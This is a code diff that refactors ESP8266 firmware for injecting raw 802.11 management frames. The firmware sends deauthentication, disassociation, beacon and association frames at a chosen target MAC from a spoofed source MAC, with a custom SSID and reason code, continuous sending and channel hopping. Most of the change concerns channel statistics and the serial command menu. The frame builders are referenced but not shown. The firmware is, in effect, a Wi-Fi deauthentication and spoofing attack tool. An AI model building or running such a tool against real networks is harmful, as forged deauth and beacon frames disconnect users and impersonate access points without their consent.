-        } while (channel_stats[channel].status != old_status);
-        
+        channel_stats[channel].busy_count++;
         return false;
     }
-    
     return true;
 }
 
 // Channel management helper functions
-ICACHE_RAM_ATTR void initialize_channel_stats() {
+void initialize_channel_stats() {
     for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
         channel_stats[i].last_success = 0;
-        channel_stats[i].status = 0; // Clears fail_count, busy_count, and blacklisted
+        channel_stats[i].fail_count = 0;
+        channel_stats[i].busy_count = 0;
+        channel_stats[i].blacklisted = false;
     }
 }
 
-ICACHE_RAM_ATTR void update_channel_strategy() {
+void update_channel_strategy() {
     static unsigned long last_strategy_update = 0;
+    static uint8_t consecutive_failures = 0;
     
     if (millis() - last_strategy_update > 10000) {  // Update strategy every 10 seconds
         uint8_t total_blacklisted = 0;
         uint8_t high_failure_channels = 0;
         
         for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
-            if (channel_stats[i].isBlacklisted()) total_blacklisted++;
-            
-            // Get fail count from packed status
-            uint32_t status = channel_stats[i].status;
-            uint8_t fail_count = (status >> 16) & 0xFF;
-            if (fail_count > 3) high_failure_channels++;
+            if (channel_stats[i].blacklisted) total_blacklisted++;
+            if (channel_stats[i].fail_count > 3) high_failure_channels++;
         }
         
         // Adjust strategy based on channel conditions
@@ -871,7 +615,7 @@ ICACHE_RAM_ATTR void update_channel_strategy() {
             hopping_strategy = RANDOM;  // Try random hopping if many channels are blocked
             // Reset blacklist
             for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
-                channel_stats[i].setBlacklisted(false);
+                channel_stats[i].blacklisted = false;
             }
         } else if (high_failure_channels > MAX_CHANNEL / 3) {
             hopping_strategy = ADAPTIVE;  // Use adaptive if many channels have high failure
@@ -883,7 +627,7 @@ ICACHE_RAM_ATTR void update_channel_strategy() {
     }
 }
 
-ICACHE_RAM_ATTR bool perform_channel_hop(uint8_t& current_channel) {
+bool perform_channel_hop(uint8_t& current_channel) {
     static uint8_t retry_count = 0;
     const uint8_t MAX_RETRIES = 3;
     bool found_clear_channel = false;
@@ -902,13 +646,7 @@ ICACHE_RAM_ATTR bool perform_channel_hop(uint8_t& current_channel) {
         }
         
         retry_count++;
-        // Update busy count atomically
-        uint32_t busy_status = channel_stats[next_ch].status;
-        uint8_t busy_count = (busy_status >> 8) & 0xFF;
-        if (busy_count < 255) {
-            uint32_t new_status = (busy_status & ~0xFF00) | ((busy_count + 1) << 8);
-            channel_stats[next_ch].status = new_status;
-        }
+        channel_stats[next_ch].busy_count++;
         
         if (retry_count >= MAX_RETRIES) {
             // Force channel change if we can't find a clear one
@@ -920,6 +658,7 @@ ICACHE_RAM_ATTR bool perform_channel_hop(uint8_t& current_channel) {
     
     return found_clear_channel;
 }
+
 
 // Build and transmit the selected frame type
 bool attempt_transmission(uint8_t current_channel) {
@@ -996,18 +735,18 @@ void setup() {
 
   // Set MAC address if necessary
   wifi_set_macaddr(STATION_IF, source_mac);
+
   // Initialize WiFi channel
-  set_wifi_channel(1);  // Start on channel 1
+  wifi_channel = 1;  // Start on channel 1
 
   // Build initial packet for selected frame type
   uint16_t packet_size = 0;
-  uint8_t current_channel = get_wifi_channel();
   switch (selected_frame) {
     case FRAME_ASSOC_REQ:
-      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, current_channel);
+      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
       break;
     case FRAME_BEACON:
-      packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, current_channel);
+      packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, wifi_channel);
       break;
     case FRAME_DEAUTH:
       packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
@@ -1016,7 +755,7 @@ void setup() {
       packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
       break;
     default:
-      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, g_wifi_channel);
+      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
       break;
   }
 
@@ -1044,7 +783,7 @@ void setup() {
   if (selected_frame == FRAME_BEACON) tx_buf = beacon_buffer;
   else if (selected_frame == FRAME_DEAUTH) tx_buf = deauth_buffer;
   else if (selected_frame == FRAME_DISASSOC) tx_buf = disassoc_buffer;
-  tx_result = transmit_raw_packet(tx_buf, packet_size, 2, g_wifi_channel);
+  tx_result = transmit_raw_packet(tx_buf, packet_size, 2, wifi_channel);
 
   if (tx_result) {
     Serial.println("Transmission successful!");
@@ -1052,8 +791,6 @@ void setup() {
     Serial.println("Transmission failed! Error in packet structure or hardware access.");
     Serial.println("Try adjusting packet structure according to IEEE 802.11 standard.");
   }
-
-  print_command_menu();
 
   Serial.println("\nAvailable commands:");
   Serial.println("t - Trigger manual transmission");
@@ -1076,18 +813,15 @@ void loop() {
   unsigned long now = millis();
   
   // Update channel hopping strategy based on conditions
-  update_channel_strategy();  // Channel hopping timing
+  update_channel_strategy();
+  // Channel hopping timing
   if (now - last_hop >= DWELL_TIME) {
-    uint8_t current_channel = get_wifi_channel();
-    bool clear_channel = perform_channel_hop(current_channel);
-    if (clear_channel) {
-        set_wifi_channel(current_channel);
-    }
+    bool clear_channel = perform_channel_hop(wifi_channel);
     last_hop = now;
     
     if (debug_mode) {
       Serial.printf("Hopped to channel %d (Channel %s)\n", 
-                   current_channel,
+                   wifi_channel,
                    clear_channel ? "clear" : "busy");
     }
   }
@@ -1100,16 +834,15 @@ void loop() {
     }
       // Attempt transmission with retries and backoff
     bool tx_result = attempt_transmission(current_channel);
-      if (debug_mode) {
-        uint8_t fail_count, busy_count;
-        bool blacklisted;
-        get_channel_stats_debug(current_channel, fail_count, busy_count, blacklisted);
-        
+    
+    if (debug_mode) {
         Serial.printf("Transmission attempt on channel %d: %s\n", 
                      current_channel,
                      tx_result ? "SUCCESS" : "FAILED");
         Serial.printf("Channel stats - Fails: %d, Busy: %d, Blacklisted: %s\n",
-                     fail_count, busy_count, blacklisted ? "Yes" : "No");
+                     channel_stats[current_channel].fail_count,
+                     channel_stats[current_channel].busy_count,
+                     channel_stats[current_channel].blacklisted ? "Yes" : "No");
     }
     
     int status = tx_result ? 0 : 1;
@@ -1172,16 +905,16 @@ void loop() {
           if (!check_hardware_ready()) {
             Serial.println("Hardware busy, please wait");
             break;
-          }          uint16_t packet_size = 0;
+          }
+          uint16_t packet_size = 0;
           uint8_t* tx_buf = packet_buffer;
-          uint8_t current_channel = get_wifi_channel();
           switch (selected_frame) {
             case FRAME_ASSOC_REQ:
-              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, current_channel);
+              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
               tx_buf = packet_buffer;
               break;
             case FRAME_BEACON:
-              packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, current_channel);
+              packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, wifi_channel);
               tx_buf = beacon_buffer;
               break;
             case FRAME_DEAUTH:
@@ -1193,11 +926,11 @@ void loop() {
               tx_buf = disassoc_buffer;
               break;
             default:
-              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, g_wifi_channel);
+              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, wifi_channel);
               tx_buf = packet_buffer;
               break;
           }
-          bool tx_result = transmit_raw_packet(tx_buf, packet_size, 2, g_wifi_channel);
+          bool tx_result = transmit_raw_packet(tx_buf, packet_size, 2, wifi_channel);
           Serial.printf("Transmission %s\n", tx_result ? "successful" : "failed");
           if (debug_mode) print_packet_details(tx_buf, packet_size);
         }
@@ -1211,25 +944,27 @@ void loop() {
       case 'd': // Toggle debug mode
         debug_mode = !debug_mode;
         Serial.printf("Debug mode: %s\n", debug_mode ? "ON" : "OFF");
-        break;      case 'l': // Toggle all hopping logs
-        hop_log_enabled = !hop_log_enabled;
-        Serial.printf("All hopping logs: %s\n", hop_log_enabled ? "ON" : "OFF");
         break;
 
-      case 'e': // Toggle error-only logging
-        hop_log_on_error = !hop_log_on_error;
-        Serial.printf("Error logging: %s\n", hop_log_on_error ? "ON" : "OFF");
+      case 'h': // Show help
+        Serial.println("\nAvailable Commands:");
+        Serial.println("t - Trigger single transmission");
+        Serial.println("c - Toggle continuous mode");
+        Serial.println("d - Toggle debug mode");
+        Serial.println("h - Show this help");
+        Serial.println("s - Show current status");
+        Serial.println("1-9 - Set channel (1-9)");
+        Serial.println("m - Set custom MAC address");
+        Serial.println("f - Select frame type");
+        Serial.println("n - Set SSID");
+        Serial.println("r - Set reason code (deauth/disassoc)");
         break;
 
-      case 'u': // Toggle success logging
-        hop_log_on_success = !hop_log_on_success;
-        Serial.printf("Success logging: %s\n", hop_log_on_success ? "ON" : "OFF");
-        break;
-
-      case 's': // Show status        Serial.println("\n=== Current Status ===");
+      case 's': // Show status
+        Serial.println("\n=== Current Status ===");
         Serial.printf("Continuous Mode: %s\n", continuous_mode ? "ON" : "OFF");
         Serial.printf("Debug Mode: %s\n", debug_mode ? "ON" : "OFF");
-        Serial.printf("Current Channel: %d\n", get_wifi_channel());
+        Serial.printf("Current Channel: %d\n", wifi_channel);
         Serial.printf("Target MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      target_mac[0], target_mac[1], target_mac[2],
                      target_mac[3], target_mac[4], target_mac[5]);
@@ -1255,10 +990,12 @@ void loop() {
         }
         break;      case 'f': // Select frame type
         select_frame_type();
-        break;      case 'n': // Set SSID
-        {  // Add block scope
-          Serial.println("Enter new SSID (max 32 chars):");
-          while (!Serial.available());
+        break;
+
+      case 'n': // Set SSID
+        Serial.println("Enter new SSID (max 32 chars):");
+        while (!Serial.available());
+        {
           int len = Serial.readBytesUntil('\n', ssid, 32);
           ssid[len] = '\0';
           Serial.printf("SSID set to: %s\n", ssid);
@@ -1266,9 +1003,9 @@ void loop() {
         break;
 
       case 'r': // Set reason code
-        {  // Add block scope
-          Serial.println("Enter reason code (hex, e.g. 0001):");
-          while (!Serial.available());
+        Serial.println("Enter reason code (hex, e.g. 0001):");
+        while (!Serial.available());
+        {
           char reason_str[5] = {0};
           int len = Serial.readBytes(reason_str, 4);
           reason_str[4] = '\0';
@@ -1278,12 +1015,11 @@ void loop() {
           Serial.printf("Reason code set to: 0x%04X\n", reason_code);
         }
         break;
-        
+
       default:
         if (cmd >= '1' && cmd <= '9') {
-          uint8_t new_channel = cmd - '0';
-          set_wifi_channel(new_channel);
-          Serial.printf("Channel set to %d\n", get_wifi_channel());
+          wifi_channel = cmd - '0';
+          Serial.printf("Channel set to %d\n", wifi_channel);
         }
         break;
     }
